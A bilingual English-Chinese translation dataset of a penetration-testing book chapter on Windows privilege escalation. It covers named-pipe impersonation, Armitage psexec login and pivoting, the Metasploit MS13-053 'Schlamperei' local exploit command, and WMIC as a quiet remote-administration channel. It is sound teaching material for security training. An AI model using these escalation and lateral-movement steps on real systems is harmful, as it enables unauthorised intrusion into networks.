- en: '*Chapter 16*: Escalating Privileges'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '*第16章*：提升权限'
- en: When we consider the penetration of any system – whether it’s a computer system
    or physical access to a building, for example – no one is the king of the castle
    when the initial compromise takes place. That’s what makes real-world attacks
    so insidious and hard to detect; the attackers work their way up from such an
    insignificant position that no one sees them coming. For example, take the physical
    infiltration of a secure building. After months of research, I’m finally able
    to swipe the janitor’s key and copy it without him knowing. Now, I can get into
    the janitor’s closet at the periphery of the building. Do I own the building?
    No. Do I have a foothold that will likely allow me a perspective that wasn’t possible
    before? Absolutely. Maybe pipes and wires are passing through the closet. Maybe
    the closet is adjacent to a secure room.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们考虑渗透任何系统时——无论是计算机系统还是物理访问某个建筑物——没有人在初次攻破时是城堡的主宰。这正是现实世界攻击如此隐蔽且难以检测的原因；攻击者从一个微不足道的位置开始，几乎没人察觉他们的存在。例如，考虑物理渗透一个安全建筑。经过几个月的研究，我终于能够悄悄复制清洁工的钥匙，并且他毫不知情。现在，我可以进入建筑外围的清洁工储藏室。我拥有这座建筑吗？不。我是否拥有一个能让我看到之前无法获得的视角的立足点？当然。也许管道和电缆穿过这个储藏室。也许这个储藏室紧邻一个安全房间。
- en: 'The principle of privilege escalation involves leveraging what’s available
    in our low-privilege position to increase our permissions. This may involve stealing
    access that belongs to a high-privilege account or exploiting a flaw that tricks
    a system into executing something at an elevated privilege. We’ll take a look
    at both perspectives in this chapter by covering the following topics:'
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 权限提升的原理是利用我们低权限位置中的可用资源来提高我们的权限。这可能包括窃取属于高权限账户的访问权限，或利用漏洞欺骗系统执行某些以提升权限的操作。本章将从这两个角度进行探讨，涵盖以下主题：
- en: Climbing the ladder with Armitage
  id: totrans-3
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用 Armitage 攀登权限阶梯
- en: Local exploits with Metasploit
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用 Metasploit 进行本地漏洞利用
- en: Escalation with WMIC and PS Empire
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通过 WMIC 和 PS Empire 提升权限
- en: Looting domain controllers with vssadmin
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用 vssadmin 攻击域控制器
- en: Technical requirements
  id: totrans-7
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 技术要求
- en: 'For this chapter, you will need the following:'
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 本章所需的内容如下：
- en: Kali Linux
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Kali Linux
- en: Windows 7 SP1 running on a VM
  id: totrans-10
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在虚拟机上运行的 Windows 7 SP1
- en: Windows Server 2012 configured as a domain controller
  id: totrans-11
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 配置为域控制器的 Windows Server 2012
- en: Climbing the ladder with Armitage
  id: totrans-12
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用 Armitage 攀登权限阶梯
- en: 'Privilege escalation is a funny topic nowadays because the tools at our disposal
    do so much behind the scenes. It’s easy to take systems for granted when we’re
    playing with Metasploit and the Armitage frontend. In a Meterpreter session, for
    example, we can execute **getsystem**, and often, we get the **SYSTEM** privilege
    in a matter of seconds. How is this accomplished so effortlessly? First, we’ll
    look at a couple of core concepts in Windows: named pipes and security contexts.'
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 权限提升如今是一个有趣的话题，因为我们手头的工具在后台做了很多事情。当我们使用 Metasploit 和 Armitage 前端时，很容易把系统的复杂性视为理所当然。例如，在
    Meterpreter 会话中，我们可以执行 **getsystem**，通常在几秒钟内便能获得 **SYSTEM** 权限。为什么这一切如此轻松地完成？首先，我们将看一下
    Windows 中的几个核心概念：命名管道和安全上下文。
- en: Named pipes and security contexts
  id: totrans-14
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 命名管道与安全上下文
- en: Yes, you’re right; the word *pipe* in this context is related to pipelines in
    the Unix-like world (and, as we covered in [*Chapter 9*](B17616_09_Final_VK_ePub.xhtml#_idTextAnchor165),
    *Powershell Fundamentals*, pipelines in PowerShell). The pipelines we worked with
    were unnamed and resided in the shell. The named pipe concept, on the other hand,
    gives the pipe a name, and by having a name, it utilizes the filesystem so that
    interaction with it is like interacting with a file. Remember the purpose of our
    pipelines – to take the output of a command and pipe it as input to another command.
    This is the easier way of looking at it – behind the scenes, each command fires
    off a process. So, what the pipe is doing is allowing processes to communicate
    with each other with shared data. This is just one of several methods for achieving
    **inter-process communication** (**IPC**). Hence, to put it together, a named
    pipe is a file that processes can interact with to achieve IPC.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 是的，你说得对；在这个上下文中，*pipe*一词与类 Unix 系统中的管道相关（并且正如我们在[*第 9 章*](B17616_09_Final_VK_ePub.xhtml#_idTextAnchor165)《PowerShell
    基础》一章中讨论的那样，它也与 PowerShell 中的管道相关）。我们操作过的管道是没有名字的，并且存在于 shell 中。另一方面，命名管道概念为管道赋予了一个名字，并通过有名字这一特性，它利用了文件系统，使得与它的交互就像与文件进行交互一样。记住我们管道的目的——将一个命令的输出作为输入传递给另一个命令。这是更简化的理解方式——在幕后，每个命令都会启动一个进程。所以，管道的作用是允许进程通过共享数据互相通信。这只是实现**进程间通信**（**IPC**）的几种方法之一。因此，总结起来，命名管道是一个文件，进程可以与之交互以实现
    IPC。
- en: 'Don’t forget one of the enduring themes of our adventures through Windows security:
    Microsoft has always liked doing things their way. Named pipes in Windows have
    some important distinctions from the concept in Unix-like systems. For one, whereas
    named pipes can persist beyond the process lifetime in Unix, in Windows, they
    disappear when the last reference to them disappears. Another Windows quirk is
    that named pipes, although they work a lot like files, cannot be mounted in the
    filesystem. They have their own filesystem and are referenced with **\\.\pipe\[name]**.
    Functions are available to the software developer to work with named pipes (for
    example, **CreateFile**, **WriteFile**, and **CloseHandle**), but the user isn’t
    going to see them.'
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 不要忘记我们在 Windows 安全性探索过程中一个持久的主题：微软总是喜欢按自己的方式做事。Windows 中的命名管道与 Unix 类系统中的概念有一些重要的区别。首先，在
    Unix 中，命名管道可以超越进程的生命周期，而在 Windows 中，当最后一个引用它的对象消失时，它就会消失。Windows 的另一个特点是，尽管命名管道的工作方式与文件相似，但不能在文件系统中挂载。它们有自己的文件系统，并通过**\\.\pipe\[name]**进行引用。开发者可以使用一些函数来操作命名管道（例如，**CreateFile**、**WriteFile**
    和 **CloseHandle**），但用户是看不见它们的。
- en: There are some situations in which a named pipe is visible to the user in Windows.
    You, the wily power user, saw this concept at work while debugging with WinDbg.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Windows 中，有一些情况下，命名管道是对用户可见的。你，那个机智的高级用户，曾在使用 WinDbg 调试时看到了这个概念的运作。
- en: 'Let’s examine the concept, as implemented in Windows, a little deeper. I gave
    examples of functions for working with named pipes previously. Those are **pipe
    client** functions. The initial creation of the named pipe can be done with the
    **CreateNamedPipe** function – a **pipe server** function. The creator of a named
    pipe is a **pipe server**, and the application attaching to and using the named
    pipe is a pipe client. The client connects to the server end of the named pipe
    and uses **CreateFile** and **WriteFile** to communicate with the pipe. Although
    named pipes can only be created locally, it is possible to work with remote named
    pipes. The period in the named pipe path is swapped with a hostname to communicate
    with remote pipes:'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们更深入地探讨一下在 Windows 中实现的这个概念。我之前举过一些使用命名管道的函数的例子。那些是**管道客户端**函数。命名管道的初始创建可以通过**CreateNamedPipe**函数来完成——这是一个**管道服务器**函数。命名管道的创建者是**管道服务器**，而附加到命名管道并使用它的应用程序是管道客户端。客户端连接到命名管道的服务器端，并使用**CreateFile**和**WriteFile**与管道进行通信。尽管命名管道只能在本地创建，但也可以与远程命名管道进行交互。在命名管道路径中，句点被主机名替换，以便与远程管道进行通信：
- en: '![Figure 16.1 – Visual depiction of named pipes ](image/Figure_16.01_B17616.jpg)'
  id: totrans-19
  prefs: []
  type: TYPE_IMG
  zh: '![图 16.1 – 命名管道的视觉表现](image/Figure_16.01_B17616.jpg)'
- en: Figure 16.1 – Visual depiction of named pipes
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 图 16.1 – 命名管道的视觉表现
- en: The server-client terminology is no accident. **pipe server** creates the named
    pipe and handles pipe client requests.
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 服务器-客户端的术语并非偶然。**管道服务器**创建命名管道并处理管道客户端的请求。
- en: Impersonating the security context of a pipe client
  id: totrans-22
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 假扮管道客户端的安全上下文
- en: If you’re new to this concept, you probably read the title of this section and
    thought, *oh, named pipe client impersonation? I wonder what wizard’s hacking
    tool we’ll be installing next!* Nope. This is normal behavior and is implemented
    with the **ImpersonateNamedPipeClient** function. The security professional in
    you is probably thinking that allowing security context impersonation in IPC is
    just plain nutty, but the software designer in you may be familiar with the original
    innocent logic that allows for more efficient architecture. Suppose that a privileged
    process creates a named pipe. Thus, you have a situation where pipe client requests
    are being read and managed by a privileged pipe server. Impersonation allows the
    pipe server to reduce its privilege while processing pipe client requests. Naturally,
    allowing impersonation per se means that a pipe server with lower privilege could
    impersonate a privileged pipe client and do naughty things on the client’s behalf.
    Well, this won’t do. Thankfully, pipe clients can set flags in their **CreateFile**
    function calls to limit this impersonation, but they don’t have to. It’s not unusual
    to see this skipped.
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你对这个概念不熟悉，你可能看到了这一节的标题，并且想，*哦，命名管道客户端冒充？我想知道接下来我们会安装什么黑客工具！* 不是的。这是正常行为，是通过**ImpersonateNamedPipeClient**函数实现的。你作为安全专家可能会觉得，在IPC中允许安全上下文的冒充简直疯狂，但你作为软件设计师可能对最初的无辜逻辑很熟悉，这种逻辑允许更高效的架构。假设一个特权进程创建了一个命名管道。那么，你就有了一个情境，其中管道客户端请求由特权管道服务器读取和管理。冒充允许管道服务器在处理管道客户端请求时减少其特权。自然，允许冒充本身意味着具有较低特权的管道服务器可能会冒充特权管道客户端，并代表客户端做一些坏事。嗯，这可不行。幸运的是，管道客户端可以在**CreateFile**函数调用中设置标志，以限制这种冒充，但他们不一定需要这么做。通常会看到忽略这一步。
- en: Superfluous pipes and pipe creation race conditions
  id: totrans-24
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 多余的管道和管道创建竞态条件
- en: 'I know what the hacker in you is saying now: *it seems that the entire named
    pipe server-client concept relies on the assumption that the named pipe exists
    and the pipe server is available*. A brilliant deduction! A process could very
    well attempt to connect to the named pipe without knowing whether the pipe server
    has even created it yet. The server may have crashed, or the server end has simply
    not been created – regardless, a unique vulnerability appears if this happens:
    the pipe client’s security context can get snatched up by a process that merely
    creates the requested pipe! This can easily be exploited in situations where an
    application is designed to keep requesting a named pipe until it succeeds.'
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 我知道你内心的黑客此刻在说什么：*看起来整个命名管道服务器-客户端概念都依赖于命名管道存在且管道服务器可用这一假设*。很棒的推理！一个进程完全可能在不知道管道服务器是否已经创建管道的情况下尝试连接到命名管道。服务器可能已经崩溃，或者服务器端根本没有被创建——无论如何，如果发生这种情况，就会出现一个独特的漏洞：管道客户端的安全上下文可以被一个仅仅创建了请求管道的进程夺走！在某些应用程序设计为不断请求命名管道，直到成功的情况下，这种情况很容易被利用。
- en: A similar situation occurs when a malicious process creates a named pipe before
    the legitimate process gets the chance to – a race condition. In the Unix-like
    world, named pipes are also called **FIFOs** in honor of their *first-in, first-out*
    structure. This is pretty much how flowing through a pipe works, so it’s fitting.
    Anyway, a consequence of this FIFO structure in a named pipe creation race condition
    is that the first pipe server to create the named pipe will get the first pipe
    client that requests it. If you know for a fact that a privileged pipe client
    is going to be making a specific request, the attacker just needs to be the first
    in line to usurp the client’s security context.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 类似的情况发生在恶意进程在合法进程有机会之前创建了一个命名管道——一种竞态条件。在类Unix系统中，命名管道也被称为**FIFO**，以其*先进先出*的结构命名。这几乎与管道的流动方式一致，所以这个名称很合适。不管怎样，在命名管道创建竞态条件中，FIFO结构的一个后果是，第一个创建命名管道的管道服务器将获得第一个请求该管道的客户端。如果你知道某个特权管道客户端将会发起特定请求，攻击者只需要成为第一个排队的用户，从而篡夺客户端的安全上下文。
- en: Moving past the foothold with Armitage
  id: totrans-27
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 超越Armitage的立足点
- en: Now that we have a theoretical background about how **getsystem** does its thing,
    let’s jump back into leveraging Armitage for the post phase. If it seems like
    we’re bouncing around a bit, it’s because I think it’s important to know what’s
    going on behind the scenes when the tool removes the hurdles for you. Armitage,
    for example, will attempt escalation automatically once you gain your foothold
    on a target. Let’s take a look.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经了解了**getsystem**如何操作的理论背景，接下来让我们回到利用Armitage进行后期阶段。如果看起来我们有点跳跃，那是因为我认为了解工具背后发生的事情很重要，这样当工具为你去除障碍时，你能够理解。比如，Armitage在你成功获得目标立足点后，会自动尝试进行权限升级。让我们来看看。
- en: 'In this scenario, I’ve just managed to sniff a password off the wire. It’s
    being used on a local administrative appliance by a user who I know is a server
    administrator, so on a hunch, I attempt to authenticate to the domain controller.
    It’s unfortunate how often this works in the real world, but it’s a valuable training
    opportunity. Anyway, in Armitage, I identify the domain controller, right-click
    on the icon and select **Login**, and then select **psexec**:'
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个场景中，我刚刚成功地从网络上嗅探到一个密码。这个密码正被一个我知道是服务器管理员的用户用在一个本地管理设备上，所以我凭直觉尝试向域控制器认证。遗憾的是，这种方法在现实世界中经常奏效，但它也是一个宝贵的培训机会。无论如何，在Armitage中，我定位到域控制器，右键点击图标并选择**Login**，然后选择**psexec**：
- en: '![Figure 16.2 – Pass the Hash in Armitage ](image/Figure_16.02_B17616.jpg)'
  id: totrans-30
  prefs: []
  type: TYPE_IMG
  zh: '![图 16.2 – 在Armitage中传递哈希](image/Figure_16.02_B17616.jpg)'
- en: Figure 16.2 – Pass the Hash in Armitage
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 图 16.2 – 在Armitage中传递哈希
- en: 'The password works and the scary lightning bolts entomb the poor server. As
    I watch, I notice **NT AUTHORITY\SYSTEM** appear under the host. I authenticated
    as an administrator and Armitage was nice enough to escalate up to **SYSTEM**
    for me:'
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 密码成功了，恐怖的闪电将可怜的服务器封锁。当我观察时，我注意到**NT AUTHORITY\SYSTEM**出现在主机下。我已作为管理员认证，Armitage非常友好地帮我升级到了**SYSTEM**权限：
- en: '![Figure 16.3 – Depiction of host compromise in Armitage ](image/Figure_16.03_B17616.jpg)'
  id: totrans-33
  prefs: []
  type: TYPE_IMG
  zh: '![图 16.3 – Armitage中主机受损的示意图](image/Figure_16.03_B17616.jpg)'
- en: Figure 16.3 – Depiction of host compromise in Armitage
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 图 16.3 – Armitage中主机受损的示意图
- en: Now, we’re going to put some automation into the concept of pivoting – and Armitage
    makes it too easy.
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们要将一些自动化功能引入pivoting的概念——而Armitage让这一切变得太简单了。
- en: Armitage pivoting
  id: totrans-36
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Armitage pivoting
- en: We covered pivoting at the MSF console and it was easy enough. Armitage makes
    the process laughably simple. Remember that Armitage shines as a red-teaming tool,
    so setting up fast pivots lets even a humble team spread into the network like
    a plague.
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在MSF控制台上讲解了Pivoting，过程相当简单。Armitage让这一过程变得极其简单。记住，Armitage作为红队工具表现得非常出色，因此快速设置pivot，即使是一个小团队，也能像瘟疫一样在网络中蔓延。
- en: 'I right-click on the target and select my Meterpreter session, followed by
    **Interact**, then **Command shell**. Now, I can interact with CMD as **SYSTEM**.
    A quick **ipconfig** reveals the presence of another interface attached to a **10.108.108.0/24**
    subnet:'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 我右键点击目标，选择我的Meterpreter会话，然后点击**Interact**，接着选择**Command shell**。现在，我可以以**SYSTEM**身份与CMD交互。快速执行**ipconfig**命令，发现有另一个接口附加在**10.108.108.0/24**子网中：
- en: '![Figure 16.4 – ipconfig on the compromised host within Armitage ](image/Figure_16.04_B17616.jpg)'
  id: totrans-39
  prefs: []
  type: TYPE_IMG
  zh: '![图 16.4 – 在Armitage中受损主机上的ipconfig](image/Figure_16.04_B17616.jpg)'
- en: Figure 16.4 – ipconfig on the compromised host within Armitage
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 图 16.4 – 在Armitage中受损主机上的ipconfig
- en: 'I see you getting out your paper and pencil to write down the subnet mask and
    gateway. Now, envision me reaching out of this book in slow motion to slap it
    out of your hand. Armitage has you covered and hates it when you work too hard.
    Let’s right-click on the target and find our Meterpreter session again; this time,
    select **Pivoting**, followed by **Setup**. As you can see, Armitage already knows
    about the visible subnets. All we need to do is click **Add Pivot** after selecting
    the subnet we need to branch into:'
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 我看到你拿出纸和笔准备记下子网掩码和网关。现在，想象一下我慢动作伸手出来，把它从你手中打掉。Armitage已经帮你准备好了，它讨厌你太辛苦工作。让我们右键点击目标，再次找到我们的Meterpreter会话；这次，选择**Pivoting**，然后点击**Setup**。如你所见，Armitage已经知道了可见的子网。我们只需要点击**Add
    Pivot**，选择我们需要扩展的子网：
- en: '![Figure 16.5 – The Add Pivot dialog in Armitage ](image/Figure_16.05_B17616.jpg)'
  id: totrans-42
  prefs: []
  type: TYPE_IMG
  zh: '![图 16.5 – Armitage中的添加Pivot对话框](image/Figure_16.05_B17616.jpg)'
- en: Figure 16.5 – The Add Pivot dialog in Armitage
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 图 16.5 – Armitage中的添加Pivot对话框
- en: You’ll end up back at the main display. The difference is that now, when a particular
    scanner asks you for a network range, you can punch in your new one. Armitage
    has the pivot configured and knows how to route the probes accordingly.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 你将回到主显示界面。不同之处在于，现在，当某个特定的扫描器要求你输入网络范围时，你可以输入你的新范围。Armitage已经配置了跳板，并知道如何相应地路由探测。
- en: 'Keeping with the tradition of cool Hollywood-hacker-movie visuals, the pivot
    is visualized with green arrows pointing at all the hosts that have been learned
    through the pivot point, from which the arrows originate:'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 延续好莱坞黑客电影的酷炫视觉效果，跳板通过绿色箭头显示，指向所有通过跳板点学习到的主机，箭头的起点就是跳板。
- en: '![Figure 16.6 – Depiction of host enumeration past the foothold in Armitage
    ](image/Figure_16.06_B17616.jpg)'
  id: totrans-46
  prefs: []
  type: TYPE_IMG
  zh: '![图16.6 – 描绘在Armitage中超越立足点的主机枚举](image/Figure_16.06_B17616.jpg)'
- en: Figure 16.6 – Depiction of host enumeration past the foothold in Armitage
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 图16.6 – 描绘在Armitage中超越立足点的主机枚举
- en: One of the important basic facts of the post phase is that it’s iterative. You’ve
    just put your foot forward, so now, you can direct modules to the systems hidden
    behind your pivot point. Armitage knows what it’s doing and configures Metasploit
    behind the scenes, so everything is routed the way it needs to be. Point and click
    hacking!
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 后期阶段的一个重要基本事实是它是迭代的。你刚刚迈出了第一步，现在，你可以将模块指向隐藏在跳板点后的系统。Armitage知道自己在做什么，并在幕后配置Metasploit，所以一切都会按需要的方式路由。点点点击黑客攻击！
- en: At this point, we’ll look at an example of a local exploit – something you’d
    pull off within your established non-SYSTEM session.
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 到这时，我们来看一个本地漏洞利用的例子——你将在已建立的非SYSTEM会话内执行此操作。
- en: When the easy way fails – local exploits
  id: totrans-50
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 当简单方法失败时——本地漏洞利用
- en: Every lab demonstration is going to have certain assumptions built into it.
    One of the assumptions so far is that Armitage/Metasploit was able to achieve
    **SYSTEM** via **getsystem**. As we learned in our crash course on named pipes,
    there are defenses against this sort of thing, and we’re often blind when we execute
    **getsystem**. It’s always thought of as a mere attempt with no guarantee of results.
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 每个实验演示都会包含某些假设。到目前为止的一个假设是，Armitage/Metasploit能够通过**getsystem**实现**SYSTEM**权限。正如我们在命名管道速成课程中所学到的，针对这种情况是有防御措施的，而且我们执行**getsystem**时常常是盲目的。它总是被认为只是一种尝试，并没有保证结果。
- en: Let’s take a look at an example. In this lab computer, we compromised a lowly
    user account with snatched credentials. After verifying that I’m running as a
    low-privilege account (called **User**) with **getuid**, I background the session
    and execute **search exploits local**. This query will search through all exploits
    with **local** as a keyword. Before we fire off our chosen local escalation exploit,
    let’s take a stroll back through kernel land, where the local escalation vulnerability
    is quite the pest.
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们来看一个例子。在这台实验计算机中，我们通过窃取凭据破解了一个低权限的用户账户。在用**getuid**验证我正在以低权限账户（称为**User**）运行后，我将会话置于后台，并执行**search
    exploits local**。这个查询将搜索所有以**local**为关键字的漏洞。在我们启动选择的本地提升漏洞利用之前，让我们回到内核领域，那里本地提升漏洞可是个大麻烦。
- en: Kernel pool overflow and the danger of data types
  id: totrans-53
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 内核池溢出与数据类型的危险
- en: 'There’s a function in the Windows kernel that’s responsible for getting messages
    from a sending thread that have been forwarded over to the receiving thread for
    interthread communication: **xxxInterSendMsgEx**. Certain message types need a
    buffer returned, so allocated space needs to be defined; a call to the **Win32AllocPoolWithQuota**
    function is made after determining the needed buffer size. How this is determined
    is important. There are two considerations: the message type and the arguments
    that were passed to the system call requiring the message to be sent. If the expected
    returned data is a string, then we have the question of how the characters are
    encoded; good ol’-fashioned ASCII or WCHAR. Whereas ASCII is a specific character
    encoding with a standardized size of 8 bits per character, WCHAR means *wide character* and
    more broadly refers to character sets that use more space than 8 bits. Back in
    the late 1980s, the **Universal Coded Character Set** (**UCS**) appeared, standardized
    as ISO/IEC 10646\. It was designed to support multiple languages and could use
    16 or even 32 bits per character. The UCS character repertoire is synchronized
    with the popular Unicode standard, and today’s popular Unicode encoding formats
    include UTF-8, UTF-16, and UTF-32, with only UTF-8 having the same space requirement
    per character as ASCII. Thus, allocating space for the ASCII-encoded message **Hello,
    World!** will require 13 bytes of memory. However, in a 32-bit WCHAR format, I’ll
    need 52 bytes for the same message.'
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: Windows 内核中有一个负责从发送线程获取消息的函数，这些消息已经被转发到接收线程以实现线程间通信：**xxxInterSendMsgEx**。某些消息类型需要返回缓冲区，因此需要定义分配的空间；在确定所需的缓冲区大小后，会调用
    **Win32AllocPoolWithQuota** 函数。如何确定这个大小很重要。有两个考虑因素：消息类型和传递给系统调用的参数，这些参数要求发送消息。如果预期返回的数据是字符串，那么我们就要考虑字符是如何编码的；经典的
    ASCII 还是 WCHAR。ASCII 是一种特定的字符编码，每个字符标准化为 8 位，而 WCHAR 是 *宽字符*，广义上指的是使用超过 8 位的字符集。早在
    1980 年代末期，**通用编码字符集**（**UCS**）出现，并标准化为 ISO/IEC 10646。它设计用来支持多种语言，并且每个字符可以使用 16
    位甚至 32 位。UCS 字符集与流行的 Unicode 标准同步，今天流行的 Unicode 编码格式包括 UTF-8、UTF-16 和 UTF-32，只有
    UTF-8 与 ASCII 有相同的字符大小。因此，分配 ASCII 编码的消息 **Hello, World!** 会需要 13 字节的内存。然而，在 32
    位 WCHAR 格式下，我将需要 52 字节来存储相同的消息。
- en: 'Back to the inter-thread communication in the kernel, the **CopyOutputString**
    function goes about its business of filling up the kernel buffer while converting
    characters as needed using two criteria – the data type of the receiving window
    and the requested data type of the last argument passed to the message call. This
    gives us a total of four combinations that are handled in four different ways,
    as follows:'
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 回到内核中的线程间通信，**CopyOutputString** 函数在按需转换字符的同时，使用两个标准填充内核缓冲区——接收窗口的数据类型和传递给消息调用的最后一个参数请求的数据类型。这给我们提供了四种组合，它们以四种不同的方式处理，如下所示：
- en: '![Table 16.1](image/Table_16.01_B17616.jpg)'
  id: totrans-56
  prefs: []
  type: TYPE_IMG
  zh: '![表格 16.1](image/Table_16.01_B17616.jpg)'
- en: The key here is that these different actions will result in different data lengths,
    but the buffer has already been allocated by **xxxInterSendMsgEx** via **Win32AllocPoolWithQuota**.
    I think you see where this is going, so let’s fast forward to our Metasploit module,
    which is ready to create a scenario whereby the pool will overflow, allowing us
    to execute code with kernel power.
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 关键在于，这些不同的操作将导致不同的数据长度，但缓冲区已经通过 **xxxInterSendMsgEx** 通过 **Win32AllocPoolWithQuota**
    被分配了。我想你已经明白接下来会发生什么，所以我们快速跳转到我们的 Metasploit 模块，它已经准备好创建一个场景，导致池溢出，从而允许我们以内核权限执行代码。
- en: Let’s get lazy – Schlamperei privilege escalation on Windows 7
  id: totrans-58
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 让我们懒一点——Windows 7 上的 Schlamperei 权限提升
- en: This particular kernel flaw was addressed by Microsoft with the bulletin MS13-053
    and its associated patches. The Metasploit module that locally exploits MS13-053
    is called **Schlamperei**. It’s borrowed from German and means laziness, sloppiness,
    and inefficiency. Think that’s unfair? Set it up in Metasploit with **use exploit/windows/local/ms13_053_schlamperei**
    and then **show options**. Prepare yourself for a long list of options!
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 微软通过公告 MS13-053 及其相关补丁解决了这个特定的内核漏洞。利用 MS13-053 的本地漏洞利用模块叫做 **Schlamperei**。这个词来源于德语，意思是懒惰、马虎和低效。觉得不公平吗？在
    Metasploit 中设置 **use exploit/windows/local/ms13_053_schlamperei**，然后输入 **show
    options**。准备好迎接一长串的选项吧！
- en: 'I’m just kidding – there’s only one option, and that’s for defining the Meterpreter
    session where this will be attempted:'
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 我在开玩笑——这里只有一个选项，那就是定义 Meterpreter 会话，在该会话中尝试这一操作：
- en: '![Figure 16.7 – Local escalation to SYSTEM via the exploit module ](image/Figure_16.07_B17616.jpg)'
  id: totrans-61
  prefs: []
  type: TYPE_IMG
  zh: '![图 16.7 – 通过漏洞模块进行本地提权到SYSTEM](image/Figure_16.07_B17616.jpg)'
- en: Figure 16.7 – Local escalation to SYSTEM via the exploit module
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 图 16.7 – 通过漏洞模块进行本地提权到SYSTEM
- en: This is just one quick and dirty example, so I encourage you to review all of
    the local exploits at your disposal. Get familiar with them and their respective
    vulnerabilities and target types.
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 这只是一个快速而简单的示例，所以我鼓励你查看所有可用的本地漏洞利用方法。熟悉它们及其各自的漏洞和目标类型。
- en: Now, we’re going to dive into the magic world of leveraging Windows’ built-in
    administrative abilities.
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们深入探讨利用Windows内置的管理能力的神奇世界。
- en: Escalation with WMIC and PS Empire
  id: totrans-65
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用WMIC和PS Empire进行提权
- en: Let’s get the basic definitions out of the way. WMIC is the name of a tool and
    it stands for **Windows Management Instrumentation Command**. The command part
    refers to a command-line interface; presumably, WMICLI was deemed too long. The
    tool allows us to perform WMI operations. WMI is the Windows infrastructure for
    operations and management data. In addition to providing management data to other
    parts of Windows and other products altogether, it’s possible to automate administrative
    tasks both locally and remotely with WMI scripts and applications. Often, administrators
    access this interface through PowerShell. Keep in mind that proper treatment of
    WMIC deserves its own book, so consider this an introduction. There are great
    resources online and in bookstores if you’re curious.
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们先了解一下基本定义。WMIC是一个工具的名称，代表**Windows管理工具命令**。命令部分指的是命令行接口；可以假定WMICLI太长了。该工具允许我们执行WMI操作。WMI是Windows基础设施，用于操作和管理数据。除了向Windows的其他部分和其他产品提供管理数据外，还可以使用WMI脚本和应用程序自动化本地和远程的管理任务。通常，管理员通过PowerShell访问此接口。请记住，正确使用WMIC值得一本书的详细介绍，所以把这看作是一个介绍。如果你感兴趣，网上和书店都有很多优秀的资源。
- en: 'For now, we’re interested in this remote administration stuff I just mentioned.
    There are a couple of important facts for us to consider as a pen tester, as follows:'
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 就目前而言，我们对我刚提到的远程管理感兴趣。作为渗透测试人员，我们有几个重要的事实需要考虑：
- en: WMIC commands fired off at the command line leave no traces of software or code
    lying around. While WMI activity can be logged, many organizations fail to turn
    it on or review the logs. WMI is another Windows feature that tends to fly under
    the radar.
  id: totrans-68
  prefs:
  - PREF_UL
